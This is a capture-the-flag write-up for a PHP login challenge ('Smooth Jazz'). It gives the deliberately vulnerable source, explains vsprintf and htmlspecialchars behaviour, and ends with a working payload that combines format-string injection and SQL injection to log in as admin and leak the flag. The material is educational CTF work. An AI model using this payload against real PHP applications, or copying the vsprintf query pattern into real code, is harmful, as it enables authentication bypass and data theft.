```
<?php
function mysql_fquery($mysqli, $query, $params) {
  return mysqli_query($mysqli, vsprintf($query, $params));
}

if (isset($_POST['username']) && isset($_POST['password'])) {
  $mysqli = mysqli_connect('db', 'challuser', 'challpass', 'challenge');
  $username = strtr($_POST['username'], ['"' => '\\"', '\\' => '\\\\']);
  $password = sha1($_POST['password']);

  $res = mysql_fquery($mysqli, 'SELECT * FROM users WHERE username = "%s"', [$username]);
  if (!mysqli_fetch_assoc($res)) {
     $message = "Username not found.";
     goto fail;
  }
  $res = mysql_fquery($mysqli, 'SELECT * FROM users WHERE username = "'.$username.'" AND password = "%s"', [$password]);
  if (!mysqli_fetch_assoc($res)) {
     $message = "Invalid password.";
     goto fail;
  }
  $htmlsafe_username = htmlspecialchars($username, ENT_COMPAT | ENT_SUBSTITUTE);
  $greeting = $username === "admin" 
      ? "Hello $htmlsafe_username, the server time is %s and the flag is %s"
      : "Hello $htmlsafe_username, the server time is %s";

  $message = vsprintf($greeting, [date('Y-m-d H:i:s'), getenv('FLAG')]);
  
  fail:
}
?>
<!DOCTYPE html>
<html>
<head>
  <title>🎷 Smooth Jazz</title>
  <style>
    body {
      background-color: #f8f8f8;
      font-family: Arial, sans-serif;
    }

    .container {
      max-width: 400px;
      margin: 100px auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 5px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    h1 {
      color: #333;
    }

    form {
      margin-top: 20px;
    }

    label, input {
      display: block;
      margin-bottom: 10px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      background-color: #4287f5;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .music-player {
      margin-top: 20px;
    }

    h2 {
      color: #333;
    }

    audio {
      width: 100%;
      margin-top: 10px;
    }

    .message {
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Smooth Jazz</h1>
    <form method="post">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username" placeholder="Enter your username">

      <label for="password">Password:</label>
      <input type="password" id="password" name="password" placeholder="Enter your password">

      <input type="submit" value="Login">
    </form>
    <div class="music-player">
      <audio src="/offering-larry-stephens.mp3" id="audio"></audio>
      If you are stuck, you can <a href="javascript:document.getElementById('audio').play()">listen to some smooth jazz</a>.
    </div>
    <div id="message" class="message">
      <p><?= $message ?? '' ?></p>
    </div>
  </div>
</body>
</html>
```
+ vsprintf — Return a formatted string
+ strtr — Translate characters or replace substrings
+ htmlspecialchars(): This is a PHP function used for HTML encoding or escaping. It converts special characters to their corresponding HTML entities
+ The ENT_COMPAT | ENT_SUBSTITUTE flags: These are options that are passed to the htmlspecialchars function to control its behavior.

ENT_COMPAT: This flag specifies that only double-quotes (") should be converted to their corresponding HTML entity (&quot;). This is often used when you want to ensure that attribute values within double-quotes are properly encoded.
ENT_SUBSTITUTE: This flag tells htmlspecialchars to replace invalid characters with the Unicode replacement character (U+FFFD) rather than stripping them entirely. This helps ensure that the output remains valid and does not cause rendering issues.

+ is possible to construct a format string that that
is different when htmlspecialchars is applied? Yes it is! The trick is to realise
escaped percent chars ('%%') can also take formatting arguments. The solution I
came up with is:

%1$'>%2$s

This can be interpreted two different ways. Before encoding:
%1$'>%2$s
\----/\-/
 |     |
 |     |
 |     \-------- raw text '2$s'
 \-------------- a raw '%', taking from position 1, using < as padding char

After encoding:
%1$'&gt;%2$s
\----/\/\--/
 |     |  |
 |     |  |
 |     |  \----- string taken from 2nd position (our leak!)
 |     \-------- raw text 't;'
 \-------------- a floating point number, taking from position 1, using & as padding char
"""

Payload:
	'username': b"admin\xff%1$c||1#%1$'>%2$s",
	'password': '668'

